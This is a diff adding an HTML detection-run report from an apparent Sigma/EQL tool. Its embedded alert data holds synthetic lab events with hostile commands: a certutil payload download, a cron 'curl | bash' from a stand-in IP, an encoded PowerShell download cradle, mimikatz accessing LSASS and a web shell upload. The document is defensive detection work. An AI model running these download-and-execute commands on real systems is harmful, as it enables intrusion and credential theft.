@@ -1,0 +1,298 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Detection Forge — detection run</title>
+<style>
+:root{
+  --bg:#080c11; --panel:#0e151e; --panel-2:#121b26; --border:#1c2836;
+  --text:#e6edf3; --muted:#8b9aab; --accent:#7ee787;
+  --critical:#ff5d5d; --high:#ff9f43; --medium:#ffd166; --low:#4cc9f0;
+  --mono:ui-monospace,SFMono-Regular,Consolas,"Liberation Mono",monospace;
+}
+*{box-sizing:border-box}
+body{margin:0;background:radial-gradient(1200px 600px at 20% -10%,#12202e 0%,var(--bg) 55%);
+  color:var(--text);font:15px/1.55 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+.wrap{max-width:1240px;margin:0 auto;padding:32px 24px 64px}
+header{display:flex;justify-content:space-between;align-items:flex-start;gap:24px;flex-wrap:wrap;margin-bottom:28px}
+.brand{display:flex;gap:16px;align-items:center}
+.mark{width:52px;height:52px;border-radius:14px;display:grid;place-items:center;
+  background:linear-gradient(145deg,#16324a,#0d1a26);border:1px solid #24405c;
+  color:var(--accent);font:700 18px/1 var(--mono);letter-spacing:.5px}
+h1{margin:0;font-size:26px;letter-spacing:-.3px}
+.tag{margin:2px 0 0;color:var(--muted);font-size:13px}
+.runmeta{text-align:right;font:12px/1.7 var(--mono);color:var(--muted)}
+.pill{display:inline-block;padding:2px 9px;border-radius:999px;border:1px solid var(--border);
+  background:var(--panel-2);font:11px/1.6 var(--mono);color:var(--muted)}
+.kpis{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:24px}
+.kpi{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:14px 16px}
+.kpi .n{font:700 26px/1.1 var(--mono);letter-spacing:-1px}
+.kpi .l{color:var(--muted);font-size:12px;text-transform:uppercase;letter-spacing:.8px;margin-top:4px}
+.kpi.crit .n{color:var(--critical)}
+.controls{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:22px;
+  padding:12px;background:var(--panel);border:1px solid var(--border);border-radius:12px}
+.chip{cursor:pointer;border:1px solid var(--border);background:var(--panel-2);color:var(--muted);
+  border-radius:999px;padding:6px 13px;font:12px/1 var(--mono);transition:.15s}
+.chip:hover{color:var(--text);border-color:#2c3d51}
+.chip.active{color:#08110a;background:var(--accent);border-color:var(--accent);font-weight:700}
+.chip[data-level="critical"].active{background:var(--critical);border-color:var(--critical);color:#1a0505}
+.chip[data-level="high"].active{background:var(--high);border-color:var(--high);color:#1a0d00}
+.chip[data-level="medium"].active{background:var(--medium);border-color:var(--medium);color:#1a1400}
+.chip[data-level="low"].active{background:var(--low);border-color:var(--low);color:#001219}
+.spacer{flex:1}
+select,input{background:var(--panel-2);border:1px solid var(--border);color:var(--text);
+  border-radius:8px;padding:8px 10px;font:13px var(--mono);outline:none}
+input:focus,select:focus{border-color:#33506d}
+.grid{display:grid;grid-template-columns:minmax(0,1.65fr) minmax(300px,.95fr);gap:20px;align-items:start}
+@media(max-width:980px){.grid{grid-template-columns:1fr}}
+h2{font-size:13px;text-transform:uppercase;letter-spacing:1.2px;color:var(--muted);margin:0 0 12px}
+.card{background:var(--panel);border:1px solid var(--border);border-left:3px solid var(--border);
+  border-radius:12px;padding:16px 18px;margin-bottom:12px;transition:.15s}
+.card:hover{border-color:#2a3b4f}
+.card.critical{border-left-color:var(--critical)}
+.card.high{border-left-color:var(--high)}
+.card.medium{border-left-color:var(--medium)}
+.card.low{border-left-color:var(--low)}
+.card .top{display:flex;justify-content:space-between;gap:12px;align-items:flex-start}
+.card h3{margin:0;font-size:15.5px;font-weight:600}
+.lvl{font:700 10px/1 var(--mono);text-transform:uppercase;letter-spacing:.9px;padding:5px 8px;border-radius:6px;white-space:nowrap}
+.lvl.critical{background:rgba(255,93,93,.14);color:var(--critical);border:1px solid rgba(255,93,93,.35)}
+.lvl.high{background:rgba(255,159,67,.14);color:var(--high);border:1px solid rgba(255,159,67,.35)}
+.lvl.medium{background:rgba(255,209,102,.13);color:var(--medium);border:1px solid rgba(255,209,102,.32)}
+.lvl.low{background:rgba(76,201,240,.13);color:var(--low);border:1px solid rgba(76,201,240,.32)}
+.meta{display:flex;gap:14px;flex-wrap:wrap;color:var(--muted);font:12px/1.6 var(--mono);margin-top:8px}
+.tech{display:inline-block;margin-top:10px;margin-right:6px;padding:3px 8px;border-radius:6px;
+  background:#101c28;border:1px solid #1f3143;color:#9fd0ff;font:11px/1.4 var(--mono)}
+details{margin-top:12px;border-top:1px solid var(--border);padding-top:10px}
+summary{cursor:pointer;color:var(--muted);font:12px var(--mono)}
+summary:hover{color:var(--text)}
+pre{background:#070b10;border:1px solid var(--border);border-radius:8px;padding:12px;
+  overflow:auto;max-height:320px;font:11.5px/1.6 var(--mono);color:#b7c9da;margin:10px 0 0}
+.panel{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:16px 18px;margin-bottom:20px}
+.panel h3{margin:0 0 14px;font-size:13px;text-transform:uppercase;letter-spacing:1.2px;color:var(--muted)}
+.seq{position:relative;margin-left:6px;padding-left:18px;border-left:1px solid var(--border)}
+.seq .ev{position:relative;padding:0 0 16px}
+.seq .ev:last-child{padding-bottom:0}
+.seq .dot{position:absolute;left:-24px;top:4px;width:9px;height:9px;border-radius:50%;background:var(--border);
+  box-shadow:0 0 0 3px var(--panel)}
+.seq .dot.critical{background:var(--critical)}.seq .dot.high{background:var(--high)}
+.seq .dot.medium{background:var(--medium)}.seq .dot.low{background:var(--low)}
+.seq .t{font:11px var(--mono);color:var(--muted)}
+.seq .d{font-size:13px;margin-top:2px}
+.donut{display:flex;align-items:center;gap:16px}
+.donut .cap{font-size:12px;color:var(--muted);line-height:1.5}
+.donut .cap b{color:var(--text);font:700 20px/1.2 var(--mono);display:block}
+.hosts{list-style:none;margin:0;padding:0;font:12px var(--mono)}
+.hosts li{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px dashed var(--border);color:var(--muted)}
+.hosts li:last-child{border-bottom:0}
+.hosts b{color:var(--text)}
+.heat{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px}
+.tac{background:var(--panel-2);border:1px solid var(--border);border-radius:10px;padding:10px}
+.tac .name{font:10px/1.4 var(--mono);text-transform:uppercase;letter-spacing:.7px;color:var(--muted);margin-bottom:8px}
+.tile{display:block;width:100%;text-align:left;cursor:pointer;border-radius:6px;padding:5px 7px;margin-bottom:5px;
+  border:1px solid transparent;font:10.5px/1.35 var(--mono);transition:.12s;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tile.covered{background:#12251a;border-color:#1f4630;color:#bdf5c8}
+.tile.covered.high{background:#2a1c10;border-color:#5a3a1c;color:#ffd2a8}
+.tile.covered.critical{background:#2b1214;border-color:#5c2427;color:#ffb9b9}
+.tile.covered.medium{background:#2a2410;border-color:#5a4c1c;color:#ffe9ad}
+.tile.covered.low{background:#0f2430;border-color:#1d4457;color:#b6e9fa}
+.tile.gap{background:transparent;border:1px dashed #26313d;color:#5f6f7f}
+.tile:hover{border-color:var(--accent);color:#fff}
+.tile .id{opacity:.65;margin-right:5px}
+footer{margin-top:36px;padding-top:18px;border-top:1px solid var(--border);color:var(--muted);font:12px/1.8 var(--mono)}
+footer code{color:#b7c9da}
+.empty{color:var(--muted);font:13px var(--mono);padding:24px;text-align:center;border:1px dashed var(--border);border-radius:12px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <div class="brand">
+      <div class="mark">DF</div>
+      <div>
+        <h1>Detection Forge</h1>
+        <p class="tag">Detection-as-code run · Sigma &rarr; EQL &rarr; triage</p>
+      </div>
+    </div>
+    <div class="runmeta">
+      <div><span class="pill">window 24h</span> <span class="pill">186 events</span></div>
+      <div>generated 2026-11-11 11:33:32</div>
+    </div>
+  </header>
+
+  <section class="kpis">
+    <div class="kpi crit"><div class="n">1</div><div class="l">critical</div></div>
+    <div class="kpi"><div class="n">11</div><div class="l">rule matches</div></div>
+    <div class="kpi"><div class="n">2</div><div class="l">correlations</div></div>
+    <div class="kpi"><div class="n">12</div><div class="l">techniques</div></div>
+    <div class="kpi"><div class="n">7</div><div class="l">tactics</div></div>
+  </section>
+
+  <section class="controls">
+    <button class="chip active" data-level="all">All 11</button>
+    <button class="chip" data-level="critical">Critical 1</button>
+    <button class="chip" data-level="high">High 6</button>
+    <button class="chip" data-level="medium">Medium 3</button>
+    <button class="chip" data-level="low">Low 1</button>
+    <div class="spacer"></div>
+    <select id="host"><option value="all">all hosts</option><option value="WIN10-LAB">WIN10-LAB</option><option value="linux01">linux01</option><option value="web01">web01</option></select>
+    <input id="q" type="search" placeholder="search title, technique, host  ( / )" size="32">
+  </section>
+
+  <main class="grid">
+    <section>
+      <h2>Detections</h2>
+      <div id="alerts"></div>
+      <h2 style="margin-top:26px">Correlation alerts</h2>
+      <div id="correlations"></div>
+    </section>
+
+    <aside>
+      <div class="panel">
+        <h3>Attack sequence · WIN10-LAB</h3>
+        <div class="seq"><div class="ev"><span class="dot high"></span><div class="t">10:38:18Z · T1027</div><div class="d">PowerShell Encoded Command Execution</div></div><div class="ev"><span class="dot high"></span><div class="t">10:40:18Z · T1105</div><div class="d">Certutil Used to Download or Decode a Payload</div></div><div class="ev"><span class="dot critical"></span><div class="t">10:43:26Z · T1003.001</div><div class="d">Suspicious Process Access to LSASS</div></div><div class="ev"><span class="dot high"></span><div class="t">10:45:18Z · T1562.001</div><div class="d">Windows Defender Real-Time Protection Disabled</div></div><div class="ev"><span class="dot high"></span><div class="t">10:47:18Z · T1543.003</div><div class="d">Suspicious Service Installed From User-Writable Path</div></div><div class="ev"><span class="dot medium"></span><div class="t">10:47:48Z · T1053.005</div><div class="d">Scheduled Task Created via Schtasks</div></div></div>
+      </div>
+      <div class="panel">
+        <h3>Priority coverage</h3>
+        <div class="donut">
+          <svg width="92" height="92" viewBox="0 0 92 92" role="img" aria-label="coverage"><circle cx="46" cy="46" r="34" fill="none" stroke="#1c2836" stroke-width="9"/><circle cx="46" cy="46" r="34" fill="none" stroke="#7ee787" stroke-width="9" stroke-linecap="round" stroke-dasharray="106.8 213.6" transform="rotate(-90 46 46)"/><text x="46" y="51" text-anchor="middle" fill="#e6edf3" font-size="16" font-family="ui-monospace,monospace">10</text></svg>
+          <div class="cap"><b>10/20</b>priority techniques covered<br>10 documented gaps</div>
+        </div>
+      </div>
+      <div class="panel">
+        <h3>Events by host</h3>
+        <ul class="hosts"><li><span>linux01</span><b>19</b></li><li><span>web01</span><b>8</b></li><li><span>WIN10-LAB</span><b>6</b></li></ul>
+      </div>
+    </aside>
+  </main>
+
+  <section class="panel" style="margin-top:8px">
+    <h3>MITRE ATT&amp;CK coverage</h3>
+    <div class="heat"><div class="tac"><div class="name">Initial Access</div><button class="tile gap" data-tech="T1078" title="T1078 · Valid Accounts (not covered)"><span class="id">T1078</span>Valid Accounts</button><button class="tile covered high" data-tech="T1505.003" title="T1505.003 · PHP File Uploaded to Web Accessible Directory (high)"><span class="id">T1505.003</span>Web Shell</button></div><div class="tac"><div class="name">Execution</div><button class="tile covered high" data-tech="T1027" title="T1027 · PowerShell Encoded Command Execution (high)"><span class="id">T1027</span>PowerShell Encoded Command Execution</button><button class="tile covered high" data-tech="T1053.003" title="T1053.003 · Cron Job Executing Remote Content (high)"><span class="id">T1053.003</span>Cron</button><button class="tile covered medium" data-tech="T1053.005" title="T1053.005 · Scheduled Task Created via Schtasks (medium)"><span class="id">T1053.005</span>Scheduled Task</button><button class="tile covered high" data-tech="T1059.001" title="T1059.001 · PowerShell Encoded Command Execution (high)"><span class="id">T1059.001</span>PowerShell</button><button class="tile gap" data-tech="T1059.003" title="T1059.003 · Windows Command Shell (not covered)"><span class="id">T1059.003</span>Windows Command Shell</button><button class="tile gap" data-tech="T1059.004" title="T1059.004 · Unix Shell (not covered)"><span class="id">T1059.004</span>Unix Shell</button><button class="tile covered medium" data-tech="T1505.003" title="T1505.003 · Web Request to Common Web Shell Parameter (medium)"><span class="id">T1505.003</span>Web Shell</button></div><div class="tac"><div class="name">Persistence</div><button class="tile covered high" data-tech="T1053.003" title="T1053.003 · Cron Job Executing Remote Content (high)"><span class="id">T1053.003</span>Cron</button><button class="tile covered medium" data-tech="T1053.005" title="T1053.005 · Scheduled Task Created via Schtasks (medium)"><span class="id">T1053.005</span>Scheduled Task</button><button class="tile covered medium" data-tech="T1136.001" title="T1136.001 · New Local User Account Created (medium)"><span class="id">T1136.001</span>Local Account</button><button class="tile covered high" data-tech="T1505.003" title="T1505.003 · PHP File Uploaded to Web Accessible Directory (high)"><span class="id">T1505.003</span>Web Shell</button><button class="tile covered high" data-tech="T1543.003" title="T1543.003 · Suspicious Service Installed From User-Writable Path (high)"><span class="id">T1543.003</span>Windows Service</button><button class="tile gap" data-tech="T1547.001" title="T1547.001 · Registry Run Keys (not covered)"><span class="id">T1547.001</span>Registry Run Keys</button></div><div class="tac"><div class="name">Privilege Escalation</div><button class="tile covered high" data-tech="T1543.003" title="T1543.003 · Suspicious Service Installed From User-Writable Path (high)"><span class="id">T1543.003</span>Windows Service</button></div><div class="tac"><div class="name">Defense Evasion</div><button class="tile covered high" data-tech="T1027" title="T1027 · PowerShell Encoded Command Execution (high)"><span class="id">T1027</span>PowerShell Encoded Command Execution</button><button class="tile gap" data-tech="T1055" title="T1055 · Process Injection (not covered)"><span class="id">T1055</span>Process Injection</button><button class="tile covered high" data-tech="T1059.001" title="T1059.001 · PowerShell Encoded Command Execution (high)"><span class="id">T1059.001</span>PowerShell</button><button class="tile covered high" data-tech="T1105" title="T1105 · Certutil Used to Download or Decode a Payload (high)"><span class="id">T1105</span>Ingress Tool Transfer</button><button class="tile covered high" data-tech="T1140" title="T1140 · Certutil Used to Download or Decode a Payload (high)"><span class="id">T1140</span>Certutil Used to Download or Decode a Payload</button><button class="tile covered high" data-tech="T1562.001" title="T1562.001 · Windows Defender Real-Time Protection Disabled (high)"><span class="id">T1562.001</span>Disable or Modify Tools</button></div><div class="tac"><div class="name">Credential Access</div><button class="tile covered critical" data-tech="T1003.001" title="T1003.001 · Suspicious Process Access to LSASS (critical)"><span class="id">T1003.001</span>LSASS Memory</button><button class="tile covered low" data-tech="T1110.001" title="T1110.001 · SSH Failed Password Authentication (low)"><span class="id">T1110.001</span>Password Guessing</button><button class="tile gap" data-tech="T1110.003" title="T1110.003 · Password Spraying (not covered)"><span class="id">T1110.003</span>Password Spraying</button></div><div class="tac"><div class="name">Lateral Movement</div><button class="tile gap" data-tech="T1021.004" title="T1021.004 · SSH (not covered)"><span class="id">T1021.004</span>SSH</button></div><div class="tac"><div class="name">Command and Control</div><button class="tile gap" data-tech="T1071.001" title="T1071.001 · Web Protocols (not covered)"><span class="id">T1071.001</span>Web Protocols</button><button class="tile covered high" data-tech="T1105" title="T1105 · Certutil Used to Download or Decode a Payload (high)"><span class="id">T1105</span>Ingress Tool Transfer</button><button class="tile covered high" data-tech="T1140" title="T1140 · Certutil Used to Download or Decode a Payload (high)"><span class="id">T1140</span>Certutil Used to Download or Decode a Payload</button></div><div class="tac"><div class="name">Exfiltration</div><button class="tile gap" data-tech="T1041" title="T1041 · Exfiltration Over C2 Channel (not covered)"><span class="id">T1041</span>Exfiltration Over C2 Channel</button></div><div class="tac"><div class="name">Impact</div><button class="tile gap" data-tech="T1486" title="T1486 · Data Encrypted for Impact (not covered)"><span class="id">T1486</span>Data Encrypted for Impact</button></div></div>
+  </section>
+
+  <footer>
+    Reproduce: <code>python -m pipeline.labgen --scenario all</code> &rarr;
+    <code>python -m pipeline.ingest --reset</code> &rarr;
+    <code>python -m pipeline.detect</code> &rarr;
+    <code>python -m pipeline.report</code><br>
+    Rules are Sigma in <code>rules/sigma/</code>. Evidence in this report is synthetic lab telemetry.
+  </footer>
+</div>
+
+<script>
+const DATA = {"alerts": [{"rule_id": "1b8c4f60-7a2d-4e93-b5c1-9d0e3f7a6c48", "title": "Suspicious Process Access to LSASS", "level": "critical", "techniques": ["T1003.001"], "tactics": ["credential_access"], "index": ["lab-windows"], "query": "any where winlog.channel:\"Microsoft-Windows-Sysmon/Operational\" and ((event.code:\"10\" and winlog.event_data.TargetImage:\"*\\\\lsass.exe\" and (winlog.event_data.GrantedAccess like~ (\"0x1010\", \"0x1410\", \"0x1438\", \"0x143a\", \"0x1fffff\"))) and (not (process.executable.caseless like~ (\"*\\\\MsMpEng.exe\", \"*\\\\MpCmdRun.exe\", \"*\\\\svchost.exe\", \"*\\\\csrss.exe\"))))", "query_kql": "winlog.channel:Microsoft\\-Windows\\-Sysmon\\/Operational AND (winlog.channel:Microsoft\\-Windows\\-Sysmon\\/Operational AND ((event.code:10 AND winlog.event_data.TargetImage:*\\\\lsass.exe AND (winlog.event_data.GrantedAccess:(0x1010 OR 0x1410 OR 0x1438 OR 0x143a OR 0x1fffff))) AND (NOT (process.executable.caseless:(*\\\\MsMpEng.exe OR *\\\\MpCmdRun.exe OR *\\\\svchost.exe OR *\\\\csrss.exe)))))", "count": 1, "host": "WIN10-LAB (1)", "first_seen": "2026-11-11T10:43:26.848Z", "last_seen": "2026-11-11T10:43:26.848Z", "events": [{"@timestamp": "2026-11-11T10:43:26.848Z", "event": {"code": "10", "kind": "event", "category": ["process"], "type": ["access"], "dataset": "windows.sysmon_operational", "module": "windows"}, "host": {"name": "WIN10-LAB", "os": {"type": "windows", "platform": "windows"}}, "process": {"name": "mimikatz.exe", "executable": "C:\\Users\\Public\\mimikatz.exe", "executable.caseless": "c:\\users\\public\\mimikatz.exe", "pid": 3190}, "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": "10", "computer_name": "WIN10-LAB", "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"SourceImage": "C:\\Users\\Public\\mimikatz.exe", "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1010"}}}]}, {"rule_id": "7d2e9a41-3c58-4b0f-9e62-8f1a4d7c2b35", "title": "Certutil Used to Download or Decode a Payload", "level": "high", "techniques": ["T1105", "T1140"], "tactics": ["defense_evasion", "command_and_control"], "index": ["lab-windows"], "query": "any where process.executable.caseless:\"*\\\\certutil.exe\" and (process.command_line like~ (\"*urlcache*\", \"*verifyctl*\", \"*-decode*\", \"*-decodehex*\"))", "query_kql": "process.executable.caseless:*\\\\certutil.exe AND (process.command_line:(*urlcache* OR *verifyctl* OR *\\-decode* OR *\\-decodehex*))", "count": 1, "host": "WIN10-LAB (1)", "first_seen": "2026-11-11T10:40:18.848Z", "last_seen": "2026-11-11T10:40:18.848Z", "events": [{"@timestamp": "2026-11-11T10:40:18.848Z", "event": {"code": "1", "kind": "event", "category": ["process"], "type": ["start"], "dataset": "windows.sysmon_operational", "module": "windows"}, "host": {"name": "WIN10-LAB", "os": {"type": "windows", "platform": "windows"}}, "user": {"name": "LAB\\analyst", "domain": "LAB"}, "process": {"name": "certutil.exe", "executable": "C:\\Windows\\System32\\certutil.exe", "executable.caseless": "c:\\windows\\system32\\certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://203.0.113.44/payload.exe C:\\Users\\Public\\p.exe", "pid": 5227, "parent": {"name": "cmd.exe", "executable": "C:\\Windows\\System32\\cmd.exe", "executable.caseless": "c:\\windows\\system32\\cmd.exe", "command_line": "cmd.exe /c certutil -urlcache -f http://203.0.113.44/payload.exe C:\\Users\\Public\\p.exe", "pid": 717}}, "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": "1", "computer_name": "WIN10-LAB", "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.44/payload.exe C:\\Users\\Public\\p.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "LAB\\analyst"}}}]}, {"rule_id": "13f8c6a0-9d24-4b7e-8c15-2a6f0e9d4b83", "title": "Cron Job Executing Remote Content", "level": "high", "techniques": ["T1053.003"], "tactics": ["execution", "persistence"], "index": ["lab-linux"], "query": "any where message like~ (\"*CMD (curl*\", \"*CMD (wget*\", \"*CMD (bash -c*\", \"*CMD (sh -c*\")", "query_kql": "message:(*CMD\\ \\(curl* OR *CMD\\ \\(wget* OR *CMD\\ \\(bash\\ \\-c* OR *CMD\\ \\(sh\\ \\-c*)", "count": 1, "host": "linux01 (1)", "first_seen": "2026-11-11T10:20:18.848Z", "last_seen": "2026-11-11T10:20:18.848Z", "events": [{"@timestamp": "2026-11-11T10:20:18.848Z", "event": {"kind": "event", "category": ["process"], "type": ["start"], "dataset": "system.cron", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "root"}, "message": "(root) CMD (curl -s http://203.0.113.44/x.sh | bash)"}]}, {"rule_id": "6b1f9c83-4a7e-4d25-8c90-5e3a2b7f6d14", "title": "PHP File Uploaded to Web Accessible Directory", "level": "high", "techniques": ["T1505.003"], "tactics": ["initial_access", "persistence"], "index": ["lab-web"], "query": "any where http.request.method:\"POST\" and url.path:\"*.php\" and (url.path like~ (\"*/upload*\", \"*/uploads/*\", \"*/images/*\", \"*/tmp/*\", \"*/files/*\"))", "query_kql": "http.request.method:POST AND url.path:*.php AND (url.path:(*\\/upload* OR *\\/uploads\\/* OR *\\/images\\/* OR *\\/tmp\\/* OR *\\/files\\/*))", "count": 1, "host": "web01 (1)", "first_seen": "2026-11-11T10:53:18.848Z", "last_seen": "2026-11-11T10:53:18.848Z", "events": [{"@timestamp": "2026-11-11T10:53:18.848Z", "event": {"kind": "event", "category": ["web"], "type": ["access"], "outcome": "success", "dataset": "nginx.access", "module": "nginx"}, "host": {"name": "web01", "os": {"type": "linux", "platform": "linux"}}, "http": {"request": {"method": "POST"}, "response": {"status_code": 200}}, "url": {"path": "/uploads/shell.php", "query": null}, "source": {"ip": "203.0.113.77"}, "user_agent": {"original": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, "message": "203.0.113.77 - - \" POST /uploads/shell.php HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\""}]}, {"rule_id": "4a1f7c2e-9b3d-4e58-8a71-2c6d5f0b9e11", "title": "PowerShell Encoded Command Execution", "level": "high", "techniques": ["T1027", "T1059.001"], "tactics": ["execution", "defense_evasion"], "index": ["lab-windows"], "query": "any where (process.executable.caseless like~ (\"*\\\\powershell.exe\", \"*\\\\pwsh.exe\")) and (process.command_line like~ (\"* -enc *\", \"* -encodedcommand *\", \"* -ec *\", \"* -e JAB*\")) and (not (process.parent.executable.caseless like~ (\"*\\\\ccmexec.exe\", \"*\\\\Microsoft.ConfigurationManagement.exe\")))", "query_kql": "(process.executable.caseless:(*\\\\powershell.exe OR *\\\\pwsh.exe)) AND (process.command_line:(*\\ \\-enc\\ * OR *\\ \\-encodedcommand\\ * OR *\\ \\-ec\\ * OR *\\ \\-e\\ JAB*)) AND (NOT (process.parent.executable.caseless:(*\\\\ccmexec.exe OR *\\\\Microsoft.ConfigurationManagement.exe)))", "count": 1, "host": "WIN10-LAB (1)", "first_seen": "2026-11-11T10:38:18.848Z", "last_seen": "2026-11-11T10:38:18.848Z", "events": [{"@timestamp": "2026-11-11T10:38:18.848Z", "event": {"code": "1", "kind": "event", "category": ["process"], "type": ["start"], "dataset": "windows.sysmon_operational", "module": "windows"}, "host": {"name": "WIN10-LAB", "os": {"type": "windows", "platform": "windows"}}, "user": {"name": "LAB\\analyst", "domain": "LAB"}, "process": {"name": "powershell.exe", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "executable.caseless": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -WindowStyle Hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMAAzAC4AMAAuADEAMQAzAC4ANAA0AC8AYQAnACkA", "pid": 3668, "parent": {"name": "WINWORD.EXE", "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "executable.caseless": "c:\\program files\\microsoft office\\root\\office16\\winword.exe", "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n C:\\Users\\analyst\\Documents\\invoice.docm", "pid": 553}}, "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": "1", "computer_name": "WIN10-LAB", "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -WindowStyle Hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMAAzAC4AMAAuADEAMQAzAC4ANAA0AC8AYQAnACkA", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "User": "LAB\\analyst"}}}]}, {"rule_id": "9e5d2b73-1f48-4c6a-8d92-3b7e0f5a1c26", "title": "Suspicious Service Installed From User-Writable Path", "level": "high", "techniques": ["T1543.003"], "tactics": ["persistence", "privilege_escalation"], "index": ["lab-windows"], "query": "any where winlog.channel:\"System\" and (event.code:\"7045\" and (winlog.event_data.ImagePath like~ (\"*\\\\Users\\\\Public\\\\*\", \"*\\\\AppData\\\\*\", \"*\\\\Temp\\\\*\", \"*\\\\ProgramData\\\\*\", \"*cmd.exe /c*\", \"*powershell*\")) and (not (winlog.event_data.ServiceName like~ (\"WaaSMedicSvc\", \"BITS\", \"WinDefend\"))))", "query_kql": "winlog.channel:System AND (winlog.channel:System AND (event.code:7045 AND (winlog.event_data.ImagePath:(*\\\\Users\\\\Public\\\\* OR *\\\\AppData\\\\* OR *\\\\Temp\\\\* OR *\\\\ProgramData\\\\* OR *cmd.exe\\ \\/c* OR *powershell*)) AND (NOT (winlog.event_data.ServiceName:(WaaSMedicSvc OR BITS OR WinDefend)))))", "count": 1, "host": "WIN10-LAB (1)", "first_seen": "2026-11-11T10:47:18.848Z", "last_seen": "2026-11-11T10:47:18.848Z", "events": [{"@timestamp": "2026-11-11T10:47:18.848Z", "event": {"code": "7045", "kind": "event", "category": ["configuration"], "type": ["change"], "dataset": "windows.system", "module": "windows"}, "host": {"name": "WIN10-LAB", "os": {"type": "windows", "platform": "windows"}}, "winlog": {"channel": "System", "event_id": "7045", "computer_name": "WIN10-LAB", "provider_name": "Service Control Manager", "event_data": {"ServiceName": "UpdaterSvc", "ImagePath": "C:\\Users\\Public\\svc.exe", "ServiceType": "user mode service", "StartType": "auto start"}}, "message": "A service was installed in the system. Service Name: UpdaterSvc"}]}, {"rule_id": "38a1b7d4-2e69-4f0c-9a53-6c8e1d4b7f20", "title": "Windows Defender Real-Time Protection Disabled", "level": "high", "techniques": ["T1562.001"], "tactics": ["defense_evasion"], "index": ["lab-windows"], "query": "any where winlog.channel:\"Microsoft-Windows-Windows Defender/Operational\" and (event.code like~ (\"5001\", \"5010\", \"5012\"))", "query_kql": "winlog.channel:\"Microsoft\\-Windows\\-Windows Defender\\/Operational\" AND (winlog.channel:\"Microsoft\\-Windows\\-Windows Defender\\/Operational\" AND (event.code:(5001 OR 5010 OR 5012)))", "count": 1, "host": "WIN10-LAB (1)", "first_seen": "2026-11-11T10:45:18.848Z", "last_seen": "2026-11-11T10:45:18.848Z", "events": [{"@timestamp": "2026-11-11T10:45:18.848Z", "event": {"code": "5001", "kind": "event", "category": ["configuration"], "type": ["change"], "dataset": "windows.defender", "module": "windows"}, "host": {"name": "WIN10-LAB", "os": {"type": "windows", "platform": "windows"}}, "winlog": {"channel": "Microsoft-Windows-Windows Defender/Operational", "event_id": "5001", "computer_name": "WIN10-LAB", "provider_name": "Microsoft-Windows-Windows Defender"}, "message": "Windows Defender Antivirus Real-time Protection feature has been disabled."}]}, {"rule_id": "3d9e7b52-8c1a-4f64-9b03-6a2d8e5c7f19", "title": "New Local User Account Created", "level": "medium", "techniques": ["T1136.001"], "tactics": ["persistence"], "index": ["lab-linux"], "query": "any where message:\"*new user:*\"", "query_kql": "message:*new\\ user\\:*", "count": 1, "host": "linux01 (1)", "first_seen": "2026-11-11T10:18:18.848Z", "last_seen": "2026-11-11T10:18:18.848Z", "events": [{"@timestamp": "2026-11-11T10:18:18.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "success", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "root"}, "source": {"ip": "127.0.0.1", "port": 50760}, "system": {"auth": {"ssh": {"event": "Accepted", "method": "password"}}}, "message": "new user: name=backup, UID=1002, GID=1002, home=/home/backup, shell=/bin/bash"}]}, {"rule_id": "5f3b8d21-0e7c-4a96-b2d8-7c4e1a9f3d05", "title": "Scheduled Task Created via Schtasks", "level": "medium", "techniques": ["T1053.005"], "tactics": ["execution", "persistence"], "index": ["lab-windows"], "query": "any where process.executable.caseless:\"*\\\\schtasks.exe\" and process.command_line:\"*/create*\" and (not user.name:\"*$\")", "query_kql": "process.executable.caseless:*\\\\schtasks.exe AND process.command_line:*\\/create* AND (NOT user.name:*$)", "count": 1, "host": "WIN10-LAB 